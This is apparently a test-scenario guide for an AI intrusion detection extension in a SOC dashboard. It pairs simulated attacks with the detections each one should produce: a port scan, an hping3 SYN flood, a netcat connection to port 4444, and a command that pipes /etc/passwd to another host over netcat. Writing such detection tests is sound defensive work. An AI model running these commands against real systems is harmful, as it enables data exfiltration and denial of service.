# AI Validation & Testing Scenarios

This document outlines the testing scenarios to validate the AI Intrusion Detection Extension inside the DLDS SOC Dashboard.

## 1. Port Scan Test
**Objective**: Validate if the AI detects aggressive port scanning.
**Simulation**:
```bash
nmap -p- -T4 192.168.1.100
```
**Expected Dashboard Results**:
- Zeek logs massive number of connection attempts.
- **AI Label**: `suspicious` (due to high volume of dropped/unanswered connections on unusual ports).
- **AI Confidence**: > 65%
- **AI Evidence**: "Abnormal traffic patterns." or "Model predicted Suspicious activity."

## 2. DDoS Simulation Test
**Objective**: Detect high-volume network flooding.
**Simulation**:
```bash
hping3 -S --flood -V 192.168.1.100
```
**Expected Dashboard Results**:
- **AI Label**: `malicious`
- **AI Confidence**: > 85%
- **AI Evidence**: "High data transfer detected" and "Model predicted Malicious due to high risk feature correlation."
- The Anomaly Score should be near `0.9+`.

## 3. Suspicious Port 4444 Test
**Objective**: Detect reverse shell or Metasploit payload defaults.
**Simulation**:
```bash
nc -nv 192.168.1.100 4444
```
**Expected Dashboard Results**:
- **AI Label**: `malicious`
- **AI Evidence**: Port 4444 usage combined with continuous data stream.
- **AI Reason**: "Heuristic detected multiple high-risk indicators."

## 4. Data Exfiltration Test
**Objective**: Detect large amounts of data leaving the network or sensitive file access.
**Simulation**:
```bash
cat /etc/passwd | nc 192.168.1.200 8080
```
**Expected Dashboard Results**:
- Auditd registers access to `/etc/passwd`.
- Zeek registers outbound bytes > 5000.
- Correlator links the two events.
- **AI Label**: `malicious`
- **AI Evidence**: "Sensitive file access involved", "High data transfer detected".
- **Anomaly Score**: Very High (Near 1.0).

---
*Note: Ensure `train_model.py` has been executed to generate `models/rf_model.pkl` to see the actual ML predictions.*

## Automated Live Replay Validation

Use the operational harness to run multi-scenario replay and produce a structured report:

```bash
python3 scripts/live_tcpreplay_validation.py \
  --iface eth0 \
  --scenario-file simulation/tcpreplay_scenarios.json \
  --report-file data/output/live_tcpreplay_report.json
```

The report includes per-scenario status and pre/post Elasticsearch ingestion counters.
